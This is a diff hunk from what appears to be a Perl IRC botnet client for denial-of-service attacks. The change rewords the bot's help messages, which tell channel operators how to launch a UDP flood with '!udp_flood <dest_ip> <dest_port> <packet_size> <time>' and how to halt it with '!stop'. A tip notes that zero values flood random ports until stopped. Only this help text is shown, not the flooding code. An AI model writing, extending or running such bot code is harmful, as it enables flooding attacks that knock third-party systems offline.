@@ -90,15 +90,13 @@ while (my $answer = <$con>)
   # Shows avaliable commands
   if ($answer =~ /(:!commands|:!help)/mgi)
   {
-    print $con "PRIVMSG $channel :To start attacking, run:\r\n";
-    print $con "PRIVMSG $channel :=> !udp_flood <dest_ip> <dest_port> <packet_size> ".
-               "<time>\r\n";
+    print $con "PRIVMSG $channel :To start attacking, run: ".
+               "!udp_flood <dest_ip> <dest_port> <packet_size> <time>\r\n";
+    print $con "PRIVMSG $channel :To stop, run: !stop\r\n";
     print $con "PRIVMSG $channel :Tip: dest_port, packet_size and time can ".
                "be set to zero (eg: !udp_flood 192.168.0.1 0 0 0). It allows ".
                "to send random packets to random ports util the !stop ".
                "order.\r\n";
-    print $con "PRIVMSG $channel :To stop, run:\r\n";
-    print $con "PRIVMSG $channel :=> !stop\r\n";
   }
 
   # Starts the attack
